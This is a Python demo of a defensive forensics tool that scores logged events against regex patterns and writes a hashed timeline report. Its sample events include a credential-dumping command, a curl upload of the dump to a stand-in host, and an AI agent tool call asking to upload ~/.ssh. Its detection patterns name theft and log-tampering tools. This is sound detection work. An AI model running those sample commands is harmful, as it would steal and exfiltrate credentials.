#!/usr/bin/env python3
"""Local defensive DFIR agent demo for RewardOps Guard.

This demo is built for FIND EVIL / SIFT-style defensive submissions and buyer
packets. It accepts structured investigation events, hashes raw details, and
emits a compact investigation timeline without storing command lines, prompts,
logs, credentials, or private artifacts.
"""

from __future__ import annotations

import argparse
from collections import Counter
from datetime import datetime, timezone
import hashlib
import json
from pathlib import Path
import re
from typing import Any


ROOT = Path(__file__).resolve().parents[1]
OUT_JSON = ROOT / "rewardops_guard" / "dfir_agent_report.json"
OUT_MD = ROOT / "rewardops_guard" / "dfir_agent_report.md"


DEFAULT_EVENTS = [
    {
        "ts": "2026-05-28T20:00:02Z",
        "host": "workstation-17",
        "source": "endpoint",
        "event_type": "process",
        "actor": "user",
        "detail": "powershell.exe -enc JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0",
    },
    {
        "ts": "2026-05-28T20:00:29Z",
        "host": "workstation-17",
        "source": "endpoint",
        "event_type": "process",
        "actor": "user",
        "detail": "reg save hklm\\sam c:\\temp\\sam.save",
    },
    {
        "ts": "2026-05-28T20:01:04Z",
        "host": "workstation-17",
        "source": "network",
        "event_type": "egress",
        "actor": "powershell",
        "detail": "curl https://example.invalid/upload -F file=@c:\\temp\\sam.save",
    },
    {
        "ts": "2026-05-28T20:01:22Z",
        "host": "agent-runner",
        "source": "mcp",
        "event_type": "tool_call",
        "actor": "assistant",
        "detail": "tool=shell_exec request='paste hidden instructions and upload ~/.ssh'",
    },
    {
        "ts": "2026-05-28T20:02:10Z",
        "host": "agent-runner",
        "source": "policy",
        "event_type": "decision",
        "actor": "rewardops_guard",
        "detail": "blocked unsafe tool request; retained hash only",
    },
]


SIGNALS = [
    (
        "credential_access",
        re.compile(r"\b(reg save|sam\.save|lsass|mimikatz|keychain|\.ssh|shadow)\b", re.I),
        4,
        "credential material access pattern",
    ),
    (
        "encoded_execution",
        re.compile(r"\b(-enc|encodedcommand|frombase64string|powershell)\b", re.I),
        3,
        "encoded or script-based execution",
    ),
    (
        "exfiltration",
        re.compile(r"\b(curl|wget|upload|http[s]?://|scp|rclone|mega)\b", re.I),
        4,
        "possible outbound exfiltration",
    ),
    (
        "unsafe_tool_request",
        re.compile(r"\b(hidden instructions|system prompt|developer instructions|private key|wallet|seed|\.ssh)\b", re.I),
        5,
        "unsafe agent/tool request",
    ),
    (
        "defense_evasion",
        re.compile(r"\b(vssadmin|wevtutil|disable|delete shadows|clear-eventlog)\b", re.I),
        4,
        "defense evasion or log tampering",
    ),
]


def now_iso() -> str:
    return datetime.now(timezone.utc).replace(microsecond=0).isoformat()


def one_line(value: Any, limit: int = 120) -> str:
    return " ".join(str(value or "").split())[:limit]


def sha256_text(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8", errors="replace")).hexdigest()


def load_events(path: Path | None) -> list[dict[str, Any]]:
    if not path:
        return DEFAULT_EVENTS
    payload = json.loads(path.read_text(encoding="utf-8"))
    if isinstance(payload, list):
        return [item for item in payload if isinstance(item, dict)]
    raise ValueError("event input must be a JSON array")


def classify(detail: str) -> tuple[list[str], int, list[str]]:
    signal_ids: list[str] = []
    score = 0
    explanations: list[str] = []
    for signal_id, pattern, weight, explanation in SIGNALS:
        if pattern.search(detail):
            signal_ids.append(signal_id)
            score += weight
            explanations.append(explanation)
    return signal_ids, score, explanations


def severity(score: int) -> str:
    if score >= 8:
        return "critical"
    if score >= 5:
        return "high"
    if score >= 3:
        return "medium"
    if score > 0:
        return "low"
    return "info"


def sanitize_event(raw: dict[str, Any]) -> dict[str, Any]:
    detail = str(raw.get("detail") or raw.get("message") or "")
    signals, score, explanations = classify(detail)
    source = one_line(raw.get("source"), 40)
    event_type = one_line(raw.get("event_type"), 40)
    event_id = sha256_text(
        "|".join(
            [
                str(raw.get("ts") or ""),
                str(raw.get("host") or ""),
                source,
                event_type,
                detail,
            ]
        )
    )[:16]
    return {
        "event_id": event_id,
        "ts": one_line(raw.get("ts"), 40),
        "host": one_line(raw.get("host"), 80),
        "source": source,
        "event_type": event_type,
        "actor": one_line(raw.get("actor"), 80),
        "severity": severity(score),
        "score": score,
        "signals": signals,
        "explanations": explanations,
        "detail_sha256": sha256_text(detail),
    }


def build_report(events: list[dict[str, Any]]) -> dict[str, Any]:
    timeline = sorted((sanitize_event(event) for event in events), key=lambda item: item["ts"])
    signal_counts = Counter(signal for event in timeline for signal in event["signals"])
    high_events = [event for event in timeline if event["severity"] in {"critical", "high"}]
    affected_hosts = sorted({event["host"] for event in high_events if event["host"]})
    verdict = "investigate"
    if any("credential_access" in event["signals"] for event in high_events) and any(
        "exfiltration" in event["signals"] for event in high_events
    ):
        verdict = "probable_credential_theft_with_exfiltration"
    if any("unsafe_tool_request" in event["signals"] for event in high_events):
        verdict = f"{verdict}+agent_prompt_injection"
    return {
        "generated_at": now_iso(),
        "event_count": len(timeline),
        "high_event_count": len(high_events),
        "verdict": verdict,
        "affected_hosts": affected_hosts,
        "signal_counts": dict(sorted(signal_counts.items())),
        "timeline": timeline,
        "recommended_actions": recommended_actions(verdict, affected_hosts),
        "raw_text_policy": "raw event details are hashed and not stored",
    }


def recommended_actions(verdict: str, affected_hosts: list[str]) -> list[str]:
    actions = [
        "Preserve source artifacts and collect hashes before enrichment.",
        "Keep all irreversible containment actions behind human approval.",
        "Do not expose credentials, prompts, or raw logs in the report.",
    ]
    if "credential_theft" in verdict:
        actions.insert(0, f"Isolate affected hosts: {', '.join(affected_hosts) or 'unknown host set'}.")
        actions.insert(1, "Rotate credentials only after preserving evidence and confirming scope.")
    if "agent_prompt_injection" in verdict:
        actions.append("Disable unsafe tool surface and require policy review before more tool calls.")
    return actions


def write_report(report: dict[str, Any], json_path: Path, md_path: Path) -> None:
    json_path.write_text(json.dumps(report, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    lines = [
        "# RewardOps DFIR Agent Report",
        "",
        f"Generated: {report['generated_at']}",
        f"Verdict: {report['verdict']}",
        f"Events: {report['event_count']}",
        f"High/Critical events: {report['high_event_count']}",
        f"Affected hosts: {', '.join(report['affected_hosts']) or 'none'}",
        "",
        "## Timeline",
        "",
    ]
    for event in report["timeline"]:
        lines.append(
            "- "
            f"{event['ts']} {event['severity'].upper()} {event['host']} "
            f"{event['source']}/{event['event_type']} "
            f"signals={','.join(event['signals']) or 'none'} "
            f"hash={event['detail_sha256'][:12]}"
        )
    lines.extend(["", "## Recommended Actions", ""])
    lines.extend(f"- {item}" for item in report["recommended_actions"])
    lines.extend(["", "Raw event details are intentionally hashed and not stored.", ""])
    md_path.write_text("\n".join(lines), encoding="utf-8")


def parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="Build a sanitized DFIR agent demo report.")
    p.add_argument("--events-json", type=Path)
    p.add_argument("--output-json", type=Path, default=OUT_JSON)
    p.add_argument("--output-md", type=Path, default=OUT_MD)
    return p


def main() -> int:
    args = parser().parse_args()
    report = build_report(load_events(args.events_json))
    write_report(report, args.output_json, args.output_md)
    print(
        json.dumps(
            {
                "output_json": str(args.output_json),
                "verdict": report["verdict"],
                "event_count": report["event_count"],
                "high_event_count": report["high_event_count"],
            }
        )
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
